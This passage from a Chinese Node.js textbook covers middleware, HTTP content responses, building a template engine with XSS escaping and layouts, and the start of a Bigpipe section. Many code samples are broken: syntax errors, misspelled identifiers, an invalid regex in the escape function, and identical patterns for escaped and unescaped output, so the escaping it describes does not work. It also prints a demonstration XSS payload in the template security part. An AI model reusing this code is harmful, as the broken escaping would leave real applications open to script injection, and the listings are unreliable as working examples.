    var middleware = stack.shift();
    if(middleware) {
      // 传入next()函数自身，使中间件能够执行结束后递归
      middleware(req, res, next);
    } catch(err) {
      next(err);
    }
  };

  // 启动执行
  next();
};
```

由于异步方法的异常不能直接捕获（在第四章中有过阐述），中间件异步产生的异常需要自己传递出来：

```js
var session = function (req, res, next) {
  var id = req.cookie.sessionid;
  store.get(id, function (err, session) {
    if (err) return next(err); // 通过中间件传递err

    req.session = session;
    next();
  });
};
```

`next()`方法接到异常对象后，会将其交给`handle500()`进行处理。为了将中间件的思想延续下去，我们认为进行异常处理的中间件也是能进行数组式处理的。由于要同时传递异常，所以用于处理异常的中间件的设计与普通中间件的略有差别，它的参数有 4 个：

```js
var middleware = function (err, req, res, next) {
  // TODO
  next();
};
```

我们通过`use()`可以将所有异常处理的中间件注册起来：

```js
app.use(function (err, req, res, next) {
  // TODO
});
```

为了区分普通中间件和异常处理中间件，`handle500()`方法将会对中间件按参数进行选取，然后递归执行。

```js
var handle500 = function (err, req, res, stack) {
  // 选取异常处理中间件
  stack = stack.filter(function (middleware) {
    return middleware.length === 4;
  });

  var next = function () {
    // 从stack数组中取出中间件并执行
    var middleware = stack.shift();

    if (middleware) middleware(err, req, res, next); // 传递异常对象
  };

  // 启动执行
  next();
};
```

### 8.4.2 中间件与性能

前文我们添加了强大的中间件组织能力，如果注意到一个现响的化，那就是我们的业务逻辑往往是最后才执行。为了让业务逻辑提早执行，尽早响应给终端用户，中间件的编写和使用是需要一番考究的。下面是两个主要的能提升的点：

- 编写高效的中间件。
- 合理利用路由，避免不必要的中间件执行。

#### 1.编写高效的中间件

编写高效的中间件其实就是提升单个处理单元的处理速度，以早调用`next()`执行后续逻辑。需要直到的事情是，一旦中间件被匹配，那么每个请求都会使该中间件执行一次，哪怕它只是
浪费 1ms 的执行事件，都会让我们的 QPS 显著下讲。常见的优化方法有几种。

- 使用高效的方法。必要时通过 jsperf.com 测试基准性能。
- 缓存需要重复计算的结果（需要控制缓存用量，原因在第五章阐述过）。
- 避免不必要的计算。比如 HTTP 报文体的解析，对于 GET 方法完全不需要。

#### 2.合理使用路由

在拥有一堆高效的中间件后，并不意味着每个中间件我们都使用，合理的路由使得不必要的中间件不参与请求处理的过程。这里以一个示例来说明该问题。

假设我们这里有一个静态文件的中间件，它会对请求进行判断，如果磁盘上存在该文件，则响应对应的静态文件，否则就交给下游中间件处理：

```js
var staticFile = function (req, res, next) {
  var pathname = url.parse(req.url).pathname;

  fs.readFile(path.join(ROOT, pathname), function (err, file) {
    if(err)
      return next();

    var writeHead(200);
    res.end(file);
  });
};
// 如果我们用如下方式注册路由：

app.use(staticFile);
```

那么意味着对`/`路径下的所有 URL 请求都会进行判断。又由于它中间涉及到了磁盘 I/O，如果成功匹配，它的效率还行，但是如果不成功匹配，每次的磁盘 I/O 都是对性能的浪费，使得 QPS 直线下讲。

对于这种情况，我们需要做的是提升匹配成功率，那么久不能使用默认的`/`路径来进行匹配，因为它的误伤率太高。给他添加一个更好的路由路径是一个不错的选择：

```js
app.use('/public', staticFile);
```

这样只有`/public`路径会匹配上，其余路径根本不会涉及该中间件。

### 8.4.3 小结

中间件使得前文的基础功能，从凌乱的发散状态收敛成很规整的组织方式。对于单个中间件而言，它足够简单，职责单一。与像面条一样杂糅在一起的逻辑判断相比，它具备更好的可测试性。中间件机制使得 Web 应用具备良好的可扩展性和可组合性，可以轻易地进行数据增删。从某种角度来讲，它是 Unix 哲学的一个实现，专注简单，小而美，然后通过组合使用，发挥出强大的能量。

中间件是 Connect 的经典模式，通过本节的叙述，我们已经可以看到整个 Connect 是如何搭建轮廓的。本节视图解释 Web 开发过程的前置思路，省略了许多细节，尽管与实际的 Connect 代码不尽相同希望借助这些思路，每位开发者都能独立写出适应自己业务需求的框架。

## 8.5 页面渲染

通过中间件机制组织基础功能完成我们的请求预处理后，不管是通过 MVC 还是通过 RESTful 路由，开发者或者是调用数据库，或者是进行文件操作，或者是处理内存，这时我们中遇到了响应客户端的部分了。这里的“页面渲染”是狭义的标题，我们其实响应的可能是一个 HTML 网页，也可能是 CSS、JS 文件，或者是其它媒体文件。这里我们要承接上文谈论的 HTTP 响应实现的技术细节，主要包含内容响应和页面渲染两个部分。

对于过去流行的 ASP、HPH、JSP 等动态网页技术，页面渲染时一种内置的功能。但对于 Node 来说，它并没有这样的内置功能，在本节的介绍中，你会看到正式因为这个标准功能的缺失，我们可以更贴近底层，发展出更多更好的渲染技术，社区的创造力使得 Node 在 HTTP 相应上呈现出更加丰富多彩的状态。

### 8.5 内容响应

在第七章我们介绍了 http 模块封装了对请求报文和响应报文的操作，这里我们则展开说明应用层该如何使用响应的封装。服务器端响应的报文，最终都要被终端处理。这个终端可能是命令行终端，也可能是代码终端，也有可能是浏览器。服务器端的响应从一定程度上决定或只是了客户端该如何处理响应的内容。

内容响应的过程中，响应报头的 Content-\*字段十分重要。在下面的示例响应报文中，服务端告知客户端内容是以 gzip 编码的，其内容长度为 21170 个字节，内容为 JavaScript，字符集为 UTF-8：

```sh
Content-Encoding: gzip
Content-Length: 21170
Content-Type: application/javascript; charset=utf-8
```

客户端在接收到这个报文后，正确的处理过程是通过 gzip 来解码报文体中的内容，用长度校验文本内容是否正确，然后再以字符集 UTF-8 将解码后的脚本插入到文本节点中。

#### 1. MIME

如果想要客户端用正确的方式来响应内容，了解 MIME 是必不可少。可以先猜想一下下面的两段代码再客户端会有什么样的差异：

```js
res.writeHead(200, { 'Content-Type': 'text/plain' });
res.end('<html><body>hello world</body></html>\n');
// 或者
res.writeHead(200, { 'Conent-Type': 'text/html' });
res.end('<html><body>hello world</body></html>\n');
```

在网页中，前者显示的是`<html><body>hello world</body></html>`，而后者只能看到`hello world`。没错，引起上述差异的原因就在于他们的 Content-Type 字段的值是不同的。浏览器对内容采用了不同的处理方式，前者为纯文本，后者为 HTML，并渲染了 DOM 树。浏览器正式通过不同的 Content-Type 的值来决定采用不同的渲染方式，这个值我们简称为 MIME 值。

MIME 的全称是 Multipurpose Internet Mail Extensions，从名字来看，它最早用于电子邮件，后来也应用到浏览器中。不同的文件类型具有不同的 MIME 值，如 JSON 文件的值为 application/json、XML 文件的值为 application/xml、PDF 文件的值为 application/pdf。

为了方便获知文件的 MIME 值，社区有专有的 mime 模块可以用判断文件类型。它的调用十分简单：

```js
var mime = require('mime');

mime.lookup('/path/to/file.txt'); // => text/plain
mime.lookup('file.txt'); // => text/plain
mime.lookup('.TXT'); // => text/plain
mime.lookup('htm'); // => text/html
```

除了 MIME 值外，Content-Type 的值中还可以包含一些参数，如字符集。`Content-Type: text/javascript; charset=utf-8`

#### 2. 附件下载

在一些场景中，无论响应的内容是什么样的 MIME 值，需求中并不要求客户端去打开它，只需要弹出并下载它即可。为了满足这种需求，Content-Disposition 字段应声登场。Content-Disposition 字段影响的行为是客户端会更具它的值判断，是应该将报文数据当作即时浏览的内容，还是可下载的附件。当内容只查看即是查看时，它的值为 inline,当数据可以存为附件时，它的值为 attachment。另外 Content-Disposition 字段还能通过设置参数指定保存时应该使用的文件名：`Content-Disposition: attachment; filename="filename.txt"`。

如果我们要涉及一个响应附件下载的 API（res.sendfile），我们的方法大致如下：

```js
res.sendfile = function (filepath) {
  fs.stat(filepath, function (err, stat) {
    var stream = fs.createReadStream(filepath);
    // 设置内容
    res.setHeader('Content-Type', mime.lookup(filepath));
    // 设置长度
    res.setHeader('Content-Length', stat.size);
    // 设置附件
    res.setHeader('Content-Disposition', 'attachment; filename="' + path.basename(filepath) + '"');
    res.writeHead(200);
    stream.pipe(res);
  });
};
```

#### 3. 响应 JSON

为了快捷地响应 JSON 数据，我们也可以如下进行封装：

```js
res.json = function (json) {
  res.setHeader('Content-Type', 'application/json');
  res.writeHead(200);
  res.end(JSON.stringify(json));
};
```

#### 4. 响应跳转

当我们的 URL 因为某些问题（譬如权限设置）不能处理当前请求，需要将用户跳转到别的 URL 时，我们也可以封装出一个快捷的方法实现跳转：

```js
res.redirect = function (url) {
  res.setHeader('Location', url);
  res.writeHead(302);
  res.end('Redirect to' + url);
};
```

### 8.5.2 视图渲染

Web 应用的内容响应形式十分丰富，可以是静态文件内容，也可以是其它附件文件，也可以是跳转等。这里我们回到主流的普通 HTML 内容的响应上，总称视图渲染。Web 应用最终呈现在界面的内容，都是通过一系列是视图渲染呈现出来的。在动态页面技术中，最终的视图是由模板和数据共同生成出来的。

模板是带有特殊标签的 HTML 片段，通过与数据的的渲染，将数据填充到这个特殊标签中，最后生成普通的带数据的 HTML 片段。通常我们将渲染方法设计为`render()`，参数就是模板路径和数据：

```js
res.render = function (view, data) {
  res.setHeader('Content-Type', 'text/html');
  res.writeHead(200);
  // 实际渲染
  var html = render(view, data);
  res.end(html);
};
```

在 Node 中，数据自然是以 JSON 为首选，但是模板却有太多选择可以使用。上面代码中的`render()`我们可以看成是一个约定接口，接收相同参数，最后返回 HTML 片段。这样的方法我们都视作实现了这个接口。

### 8.5.3 模板

最早的服务器端动态页面看法，是在 CGI 程序或 servlet 中输出 HTML 片段，通过网络流输出到客户端，客户端将其渲染到用户界面上。这种逻辑代码与 HTML 输出的代码混杂在一起的开发方式，导致一个小小的 UI 改动也要大动干戈，甚至需要重新编译。为了改变这种情况，使 HTML 与逻辑代码分离出来，催生出一些服务器端动态网页技术，如 ASP、PHP、JSP。它们将动态语言部分通过特殊的标签（ASP 和 JSP 以<% %>作为标志，PHP 则以<? ?>作为标志）包含起来，通过 HTML 和模板标签混排，将开发者从输出 HTML 的工作中解脱出来。这样的方法虽然一定程度上减轻了开发维护的难度，但是页面中还是充斥着大量的逻辑代码。这催生了 MVC 在动态网页技术中的发展，MVC 将逻辑、显示、数据分离开来，大大提高了项目的可维护性。其中模板技术就在这样的发展中逐渐成熟起来了。

尽管模板技术看起来在 MVC 时期才广泛使用，但不可否认的是如 ASP、PHP、JSP，它们其实就是最早的模板技术。模板技术虽然多种多样，但它的实质就是将模板文件和数据通过模板引擎生成最终的 HTML 代码。形成模板技术的有 4 个因素：

- 模板语言。
- 包含模板语言的模板文件。
- 拥有动态数据的数据对象。
- 模板引擎。

对于 ASP、PHP、JSP 而言，模板属于服务器端动态页面的内置功能，模板语言就是它们的宿主语言（VBScript、JScript、PHP、Java），模板文件就是以`.php`、`.asp`、`.jsp`为后缀的文件，模板引擎就是 Web 容器。

这个时期的模板嫉妒依赖上下文，甚至要处理整个 HTTP 的请求对象。随后模板语言的发展模板可以脱离上下文环境，只要有数据对象就可以执行。如 PHP 中的 PHPLIB Template 和 FastTemplate、Java 的 XSTL，以及 Velocity、JDynamiTe、Tapestry 等模板。

这类模板的切点在于它的实现与宿主语言有很大的关联性，由于各种语言采用的模板语言不同，包含各种特殊标记，导致移植性较差。早期的企业一旦选定编程语言，就不会轻易地转换环境，所以较少有开发者去开发新的模板语言和模板引擎来适应不同的编程语言。如今异构系统越来越多，模板能够应用到多门编程语言中的这种需求也开始呈现出来。

破局者是 Mustache，他宣称自己是弱逻辑的模板（logic-less templates），定义了以`{{ }}`为标志的一套模板语言，并给出十多门编程语言的模板引擎实现，使得采用它作为模板具备很好的可移植性。但随着 Node 社区的发展，思路很快被打开，模板语言可以随意创造，模板引擎也可以随意实现。Node 社区目前与模板引擎相关模块的列表差不多要滚 3 个屏幕才能看完。并且由于 Node 与前端都采用相同的执行语言 JavaScript，所以一套模板语言也无须为它编写两套不同的模板引擎就能轻松地跨前后端共用。

模板和数据与最终结果相比，这里有一个静态、动态的划分过程，相同的模板和不同的数据可以得到不同的结果，不同的模板与相同的数据也能得到不同的结果。模板技术使得网页中的动态内容和静态内容变得不互相依赖，数据开发者与模板开发者只要约定好数据结构，两者就不用互相影响了。

但模板技术并不是什么神秘的技术，它干的实际上是拼接字符串这样很底层的活儿，只是各种模板有着各自的优缺点和技巧。说模板是拼接字符串并不为过，我们要的是模板加数据，通过模板引擎的执行，能得到最终的 HTML 字符串结果。

假设我们的模板是如下这样的，`<%=%>`就是我们指定的模板标签（选择这个标签主要因为 ASP 和 JSP 都采用它做标签，相对熟悉）：

```js
Hello <%= username%>
```

如果我们的数据是`{username: 'JacksonTian'}`，那么我们期望的结果就是 Hello JacksonTina。具体实现的过程是模板分为 Hello 和`<%= username%>`两个部分，前者为普通字符串，后者是表达式。表达式需要继续处理，与数据关联后称为一个变量值，最终将使用字符串与变量连成最终的字符串。

#### 1. 模板引擎

为了掩饰模板引擎的技术，我们通过`render()`方法实现一个简单的模板引擎。这个模板引擎会将`Hello <%= username%>`转换为`"hello " + obj.username`。该过程进行一下几个步骤。

- 语法分析。提取出普通字符串和表达式，这个过程通常用正则表达式匹配出来，`<%= %>`的正则表达式为`/<%=([\s\S]+?)%>/g`。

- 处理表达式。如果标签表达式转换为普通话的语言表达式。
- 生成待执行的语句。
- 与数据一起执行，生成最终字符串。

知晓了流程，模板函数就可以轻松愉快开工了，如下：

```js
var render = function (str, data) {
  // 模板技术，就是替换特殊标签的技术
  var tpl = str.replace(/<%=([\s\S]+?)%>/g, function (match, code) {
    return "' + obj." + code + " + '";
  });

  tpl = "var tpl = '" + tpl + "';\nreturn tpl;";
  var compiled = new Function('obj', tpl);
  return compiled(data);
};
// 调用上面的模板函数：
var tpl = 'Hello <%= username%>.';
console.log(render(tpl, { username: 'Jackson Tian' }));
// => Hello Jackson Tian
```

- 模板编译

  上述代码的实现过程中，可以看到有部分内容前文没有提及，它的内容：

  ```js
  tp = "var tpl = '" + tpl "';\nreturn tpl;";
  var compiled = new Fuction('obj', tpl);
  ```

  为了能够最终与数据一起执行生成字符串，我们需要将原始的字符串转换成一个函数对象。比如`Hello <%=username%>`这句模板字符串，最终会生成：

  ```js
  function (obj) {
    var tpl = 'Hello ' + obj.username + '.';
    return tpl;
  }
  ```

  这个过程称为模板编译，生成的中间函数只与目标那字符串相关，与具体的数据无关。如果每次都生成这个中间函数，就会浪费 CPU。为了提升模板渲染的性能速度，我们通常会采用模板预编译的方式。是故，上面的代码可以拆分为两个方法：

  ```js
  var compile = function (str) {
    var tpl = str.replace(/<%=([\s\S]+?)%>/g, function (match, code) {
      return "' +obj." + code + "+ '";
    });

    tpl = "var tpl = '" + tpl + "';\nreturn tpl;";
    return new Function('obj', tpl);
  };

  var render = function (compiled, data) {
    return compiled(data);
  };
  ```

  通过预编译缓存模板编译后的结果，实际应用中就可以实现一次编译，多次执行，而原始的方式每次执行过程中都要进行一次编译和执行。

#### 2. with 的应用

上面实现的模板引擎非常弱，只能替换变量，`<%="Jackson Tian"%>`就无法支持了。为了让他更灵活，我们需要改进它的实现，使字符串能继续表达为字符串，变量能够自动寻找属于它的对象。于是 with 关键字引入到我们的视线中。with 关键字是 JavaScript 种保守 Douglas Crockford 指责的设计，细节再本书附录 C 中有详细描述。但在这里，with 关键字可以得到很方便的应用。

```js
var compile = function (str, data) {
  // 模板技术，就是替换特殊标签的技术
  var tpl = str.replace(/<%=([\s\S]+?)%>/g, function (match, code) {
    return "' + " + code + "+ '";
  });

  tpl = "tpl = '" + tpl + "'";
  tpl = 'var tpl = "";\nwith(obj) {' + tpl + '}\nreturn tpl;';
  return new Function('obj', tpl);
};
```

普通字符串就直接输出，变量 code 的值则是 obj[code]。关于`new Function()`，这里通过它创建了一个函数对象，它的语法如下：

```js
new Function ([arg1[, arg2, [, ... argN]],] function Body)
```

Function()构造接受多个参数，最后一个参数为函数体的内容，其余参数都会用来作为新生成的函数的参数列表。

- 模板安全

  前文提到过 XSS 漏洞，它的产生大多与模板相关，如果上文中的 username 的值为`<script>alert("i am XSS.")</script>`，那么模板渲染输出的字符串将会是：

  ```js
  'Hello <script>alert("I am XSS.")</script>';
  ```

  这会在页面上执行这个脚本，如果恰好这里的 username 是在 URL 的查询字符上输入的，这就构成了 XSS 漏洞。为了提高安全性，大多数模板都提供了转义的功能。转义就是将能形成 HTML 标签的字符串转换成安全字符串，这些字符主要有&、<、>、"、'。转义函数如下：

  ```js
  var escape = function (html) {
    return String(html)
      .replace(/&(?\w+;)/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;'); // IE下不支持&apos;转义
  };
  ```

  不确定要输出 HTML 标签的字符最好都转义，为了让转义和非转义表现得更方便，<%=%>和<%-%>分别标识位转义和非转义情况：

  ```js
  var render = function (str, data) {
    var tpl = str
      .replace(/\n/g, '\\n') // 换行符替换
      .replace(/<%=([\s\S]+?)%>/g, function (match, code) {
        // 转义
        return "' + escape(" + code + ") + '";
      })
      .replace(/<%=([\s\S]+?)%>/g, function (match, code) {
        // 正常输出
        return "'" + tpl + "'";
      });
    tpl = "tpl = '" + tpl + "'";
    tpl = 'var tpl = "";\nwith(obj) {' + tpl + '}\nreturn tpl;';
    // 加上escape函数
    return new Function('obj', 'escape', tpl);
  };
  ```

  模板引擎通过正则分别匹配-和=并区别对待，最后不要忘记传入`escape()`函数。最终上面得危险代码会转换为安全的输出，如下所示：

  ```js
  'hello &lt;script&gt;arert(&quot;I am XSS.&quot;)&lt;/script&gt;';
  ```

  因此，在模板技术的使用中，时刻不要忘记转义，尤其是与输入有关的变量一定要转义。

#### 3.模板逻辑

尽管模板技术已经将业务逻辑与视图部分分离开来，但是视图上还是会存在一些逻辑来控制页面的最终渲染。为了让上述模板变得更强大一点，我们为它添加逻辑代码，使得模板可以像 ASP、PHP 那样控制页面渲染。譬如下面的代码，结果 HTML 与输入数据相关：

```tpl
<% if (user) { %>
  <h2><%= user.name %></h2>
<% } else { %>
  <h2>匿名用户</h2>
<% } %>
```

他要编译程的函数应该是如下这样的：

```js
function (obj, escape) {
  var tpl = "";
  with(obj) {
    if(user) {
      tpl +="<h2>" + escape(user.name) + "</h2>";
    } else {
      tpl += "<h2>匿名用户</h2>"
    }
  }
  return tpl;
}
```

模板引擎拼接字符串的原理还是通过正则表达式进行匹配替换，如下：

```js
var compile = function (str) {
  var tpl = str
    .replace(/\n/g, '\\n') // 将换行符替换
    .replace(/<%=([\s\S]+?)%>/g, function (match, code) {
      // 转义
      return "' + escape(" + code + ") + '";
    })
    .replace(/<%([\s\S]+?)%>/g, function (match, code) {
      // 可执行代码
      return "';\n" + code + "\n;tpl +='";
    })
    .replace(/\'\n/g, "'")
    .replace(/\n\'/g, "'");

  tpl = "tpl = '" + tpl + "';";
  // 转换空行
  tpl = tpl.replace(/''/g, "'\\n'");
  tpl = 'var tpl = "";\n with (obj || {}) {\n' + tpl + '\n}\nreturn tpl;';
  return new Function('obj', 'escape', tpl);
};
```

完成上面的实现后，试试成果。

```js
var tpl = [
  '<% if (user) { %>',
  '<h2><%=user.name%></h2>',
  '<% } %>',
  '<h2>匿名用户</h2>',
  '<% } %>',
].join('\n');

render(compile(tpl), { user: { name: 'Jackson Tian' } });

// => <<h2>Jackson Tian</h2>>

// 接下来不传递user时
render(compile(tpl), {});
// => undefined:5
// ReferenceError: user is not defined
// 为了程序的健壮性，需要将模板写得健壮点，对于不确定是否存在的属性，应该为它加上引用
var tpl = [
  '<% if (user) { %>',
  '<h2><%=user.name%></h2>',
  '<% } %>',
  '<h2>匿名用户</h2>',
  '<% } %>',
];

// 在EJS中，它的变量不是obj，而是locals，这里的值与模板引擎中的with语句有关。
// 重新执行，得到结果为
// => <h2>匿名用户</h2>
```

此外，实现了执行表达式的模板引擎还能进行循环：

```js
var tpl = [
  '<% for (var i = 0; i< item.length; i++) { %>',
  '<% var item = items[i]; %>',
  '<p><%= i+1 %>、<%= item.name %></p>',
  '<% } %>',
].josin('\n');

render(compile(tpl), { items: [{ name: 'Jacson' }, { name: '朴灵' }] });

// => <p>1、Jackson</p>
// => <p>2、朴灵</p>
```

如此，我们实现的模板引擎已经能够处理输出和逻辑了，视图的渲染逻辑不成问题。

#### 4.继承文件系统

前文我们实现的 compile()和 render()已经能够实现将输入的模板字符串进行编译和替换的功能。如果与前文的 HTTP 响应对象组合起来处理的话，我们响应一个客户端的请求大致如下：

```js
app.get('/path', function (req, res) {
  fs.readFile('file/path', 'utf8', function (err, text) {
    if (err) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end('模板文件错误');
      return;
    }

    res.writeHead(200, { 'Content-Type': 'text/html' });
    var html = render(compile(text), data);
    res.end(html);
  });
});
```

这样的响应体验并不友好，其缺点如下：

- 每次请求需要反复读取磁盘的模板文件。
- 每次请求需要编译。
- 调用繁琐。

如果你记性不差的话，应该知道大多数的 MVC 框架在渲染时只有一个简单的 render()方法，所以我们也需要一个更简洁、性能更好的 render()函数：

```js
var cache = {};
var VIEW_FOLDER = '/path/to/wwwroot/views/';

res.render = function (viewname, data) {
  if (!cache[viewname]) {
    var text;
    try {
      text = fs.readFileSync(path, join(VIEW_FOLDER, viewname), 'utf8');
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end('模板文件错误');
      return;
    }

    cache[viewname] = compile(text);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    var html = compile(data);
    res.end(html);
  }
};
```

这个 res.render()实现中，虽然有同步读取文件的情况，但是由于采用了缓存，只会在第一次读取的时候造成整个进程的阻塞，一旦缓存生效，将不会反复读取模板文件。其次，缓存之前已经进行了编译，也不会每次读取都编译。

封装完渲染函数之后，我们的调用就很轻松了，如下所示：

```js
app.get('/path', function (req, res) {
  res.render('viewname', {});
});
```

与文件系统集成后，再引入缓存，可以很好地解决性能问题，接口也大大得到简化。由于模板文件内容都不大，也不属于动态改动的，所以使用进程的内存来缓存编译结果，并不会引起太大的垃圾回收问题。

#### 5. 子模板

有时候模板文件太大，太过复杂，会增加维护难度上的难度，而且有些模板时可以重用的，这催生了子模板（Partial View）的产生。子模板可以嵌套再别的模板中，多个模板可以嵌入同一个子模板中。维护多个子模板比维护完整而复杂的大模板的成本要低很多，很多复杂问题可以降解为多个小而简单的问题。

这里我们采用`include`关键字来实现模板的嵌套：

```js
// 假设母模版如下:
`
<ul>
  <% user.forEach(function (user) { %>
    <% include user/show %>
  <% }) %>
</ul>
` // 子模板 user/show内容如下：
`<li><%=user.name%></li>` // 渲染出来的效果应当跟以下代码渲染出来的效果别无二致：
`
<ul>
  <% users.forEach(function (user) { %>
    <li><%=user.name%></li>
  <% }) %>
</ul>
`;
```

所以实现子模板的诀窍就是先将 include 语句进行替换，然后进行整体性编译：

```js
var files = {};
var preCompile = function (str) {
  var replaced = str.replace(/<%\s+(include.*)\s+%>/g, function (match, code) {
    var particial = code.split(/\s/)[1];
    if(!files[partial]) {
      files[partial] = fs.readFileSync(fs.join(VIEW_FOLDER, partial), 'utf8');
    }
    return files[partial];
  });

  // 多层嵌套，继续替换
  if(str.match(/<%\s+(include.*)\s+%>/)) {
    return preCompile(replaced);
  } else {
    return replaced;
  }
};

// 然后我们改进以下compile()函数，在正式编译前进行子模板替换。

var compile = function (str) {
  // 与解析子模板
  str = preCompile(str);
  var tpl = str.replace(/\n/g, '\\n') // 替换换行符
    .replace(/<%=([\s\S])+?%>/g, function (match, code) {
      // 转义
      return "' + escape(" + code + ") + '";
    })
    .replace(/<%=([\s\S])+?%>/g, function (match, code) {
      // 正常输出
      return "' + " + code + "+ '";
    })
    .replace(/<%([\s\S]+?)%>/g, function (match, code) {
      // 可执行代码
      return ";\n" + code + "\ntpl += '";
    })
    .replace(/\'\n/g, '\'')
    .replace('\n\'/gm, '\'');

    tpl = "tpl = '" + tpl + "';";
    // 转换空行
    tp = tpl.replace(/''/g,'\'\\n\'');
    tpl = 'var tpl = "";\nwith(obj||{}) {\n' + tpl +'n}\nreturn tpl;';
    return new Function ('obj', 'escape', tpl);
};
```

#### 6.布局视图

子模板主要是为了重用模板和降低模板的复杂度。子模板的另一种方式就是布局视图（layout)，布局视图又称母版页，它与子模板的原理相同，但是场景稍微有区别。一般而言模板指定了子模板，那它的子模板就无法进行替换了，子模板被嵌入到多个父母版中属于正常需求，但是如果多个父模板中只是嵌入的子视图不同，模板内容却完全一样，也会出现重复。比如：

```js
// 模板1
`
<ul>
  <% users.forEach(function (user) { %>
    <% include user/show %>
  <% }) %>
</ul>
` // 模板2
`
<ul>
  <% users.forEach(function(user) { %>
    <% include profile %>
  <% }) %>
</ul>
`;
```

这些重复的内容主要用来布局，为了能将这些布局重用起来，模板技术必须支持布局视图。支持布局视图之后，布局模板就只要一份，渲染视图时，指定好布局视图就可以了：

```js
res.render('viewname', {
  layout: 'layout.html',
  users: [],
});
```

对于布局模板文件，我们设计为将<%- body %>部分替换为我们的子模板：

```js
`
<ul>
  <% users.forEach(function (user) { %>
    <%- body %>
  <% }) %>
</ul>
`;

// 替换代码如下：

var renderLayout = function (str, viewname) {
  return str.replace(/<%-\s*body\s*%>/g, function (math, code) {
    if (!cache[viewname]) {
      cache[viewname] = fs.readFileSync(fs.join(VIEW_FOLDER, viewname), 'utf8');
    }
    return cache[viewname];
  });
};

// 最终集成进res.render()函数
res.render = function (viewname, data) {
  var layout = data.layout;
  if (layout) {
    if (!cache[layout]) {
      try {
        cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8');
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'text/html' });
        res.end('布局文件错误');
        return;
      }
    }
  }
  var layoutContent = cache[layout] || '<%-body%>';
  var replaced;
  try {
    replaced = renderLayout(layoutContent, viewname);
  } catch (e) {
    res.writeHead(500, { 'Content-Type': 'text/html' });
    res.end('模板文件错误');
    return;
  }

  // 将模板和布局文件名为key缓存
  var key = viewname + ':' + (layout || '');
  if (!cache[key]) {
    // 编译模板
    cache[key] = cache(replaced);
  }
  res.writeHead(200, { 'Content-Type': 'text/html' });
  var html = cache[key][data];
  res.end(html);
};
```

如此，我们轻松实现了重用布局文件：

```js
res.render('user', {
  layout: 'layout.html',
  users: [],
});

res.render('profile', {
  layout: 'layout.html',
  users: [],
});
```

#### 7. 模板性能

从前文的实现细节中我们可以看到一些模板引擎的优化步骤，主要有如下几种：

- 缓存模板文件。
- 缓存模板文件编译后的函数。

完成上述两个步骤之后，渲染的性能与生成的函数直接相关，这个函数与模板字符串的复杂度有直接关系。如果在模板中编写了执行表达式，执行表达式的性能将直接影响模板的性能。优化执行表达式就是对模板性能的优化，所以加入一条优化步骤：

- 优化模板中的执行表达式

除了这几个常见的方案外，模板引擎的实现业余性能相关。本继的视线中采用了`new Function()`，事实上还可以使用`eval()`；对于字符串的处理，本节使用的是字符串直接相加，有的模板引擎采用数组存储的方式，最后将所有字符串相连。对于变量的查找，本节采用的是 with 形成作用域的方式实现查找，有的模板引擎采用了本节第一种方式，即指定变量名的方式（obj.username）查找，指定变量变量而不用 with 可以减少切换上下文。这些细节都是影响模板速度的因素。由于现有模板引擎数量据多，此处不再做比较。

#### 8. 小结

模板技术的出现，将业务开发和 HTML 输出的工作分离开来，它的 设计原理就是单一职责原理。这与 MVC 中的数据、逻辑、视图分离如出一辙，更与前端 HTML、CSS、JavaScript 分离的设计理念一致，让视觉、结构、逻辑分离开来。随着 Node 的出现，模板能够在前后端共用实在是太寻常不过的事情，甚至都不用去重复实现引擎。本节介绍了模板的基本原理，如今各种各样的模板具备不同的特性和性能，最知名的有 EJS、Jade 灯，他们在模板语言的设计上各不相同，EJS 是 ASP、PHP、JSP 风格的模板标签，Jade 则类似于 Python、Ruby 的风格。

本节介绍了模板技术的实现细节，读者可以按照本节的思路实现自己的模板引擎，也可以使用 EJS、Jade 等成熟的模板引擎，除了上述提及的，还有过滤器等功能。

### 8.5.4 Bigpipe

这个名词与在第四章中提到的 Bagpipe 比较相似，不过 Bagpipe 翻译为风笛，用于调用限流的。此处的 Bigpipe 是产生于 Facebook 公司的前端加载技术，它的提出主要是为了解重数据页面的加载速度问题，在 2010 年的 Velocity 会议上，当时来自 Facebook 的蒋长浩先生分享了该议题，随后引起了国内业界巨大的反向。

这里以一个简单的例子说明下前文提到的 MVC 和模板技术潜在的问题：

```js
app.get('/profile', function (req, res) {
  db.getData('sql1', function (err, users) {
    db.getData('sql2', function (err, articles) {
      res.render('user', {
        layout: 'layout.html',
        users: users,
        articles: articles,
      });
    });
  });
});
```

这个例子中，我们渲染 profile 页面需要获取 users 和 articles 数据，然后通过布局文件 layout 和模板文件 user,最终发出页面到浏览器端。排除掉模板文件和布局文件可能同步的影响，将无依赖的数据获取通过 EventProxy 解开：

```js
app.get('/profile', function (req, res) {
  var ep = new EventProxy();
  ep.all('users', 'articles', function (users, articles) {
    res.render('user', {
      users: users,
      articles: articles,
    });
  });

  ep.fail(function (err) {
    res.render('err', { message: err.message });
  });

  db.getData('sql1', ep.done('users'));
  db.getData('sql2', ep.done('articles'));
});
```

问题在于我们的页面，最终的HTML要在所有的数据获取完成后才输出到浏览器端。Node通过异步已经将多个数据源的获取并行起来了，最终的页面输出速度取决于这两个数据请求中响应时间慢的那个。在解决响应数据之前，用户看到的页面是空白画面，这时十分不友好的用户体验。

Bigpipe的解决思路则讲师将页面分割成多个部分（pagelet)，先向用户输出没有数据的布局（框架），将每个每个部分输出到前端，再最终渲染填充框架，完成整个网页的渲染。这个过程中需要前端JavaScript的参与，它负责将后续输出的数据渲染到页面上。

Bigpipe则是一个需要前后端配合实现的优化技术，这个技术有几个中药店。

- 页面布局框架（无数据的）。
- 后端持续性的数据输出。
- 前后端渲染。

#### 1. 页面布局框架

页面布局框架依然由后端渲染而出：

```js
var cache = {};
var layout = 'layout.html';

app.get('/profile', function (req, res) {
  if(!cache[layout]) {
    cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8');
  }

  res.writeHead(200, {'Content-Type': 'text/html'});
  res.write(render(compile(cache[layout])));
  //TODO
});
```

这个布局文件中引入必要的前端脚本，如JQuery、Underscore等常用库，其次要引入我们重要的前端脚本，这里的文件名为bagpipe.js。整体模板文件如下：

```html
<!DOCTYPE html>
<html lang="en">
<head>
